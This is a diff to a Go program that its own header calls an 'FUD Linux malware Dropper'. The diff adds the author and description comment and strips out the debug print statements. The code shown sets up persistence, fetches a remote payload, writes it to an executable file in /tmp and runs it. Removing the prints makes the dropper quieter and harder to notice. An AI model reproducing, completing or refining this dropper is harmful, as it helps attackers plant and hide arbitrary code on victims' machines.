@@ -1,3 +1,8 @@
+/*
+ * Author : Nemuel Wainaina
+ * Alpha : FUD Linux malware Dropper
+*/
+
 package main
 
 import (
@@ -23,7 +28,6 @@ var (
 )
 
 func main() {
-	fmt.Println("Hello friend")
 	if !has_persisted() {
 		persist()
 	}
@@ -31,9 +35,7 @@ func main() {
 		time.Sleep(time.Minute)
 	}
 	fetch_payload()
-	fmt.Println("Deploying :|")
 	deploy(PAYLOAD)
-	fmt.Println("[*] Done")
 }
 
 func has_persisted() bool {
@@ -84,7 +86,6 @@ func deploy(payload []byte) {
 	FILE = fmt.Sprintf("/tmp/%s", file_name)
 	file, _ := os.OpenFile(FILE, os.O_CREATE|os.O_WRONLY, 0766)
 	file.Write(PAYLOAD)
-	fmt.Println(FILE)
 	file.Close()
 	cmd := exec.Command(FILE)
 	cmd.Start()
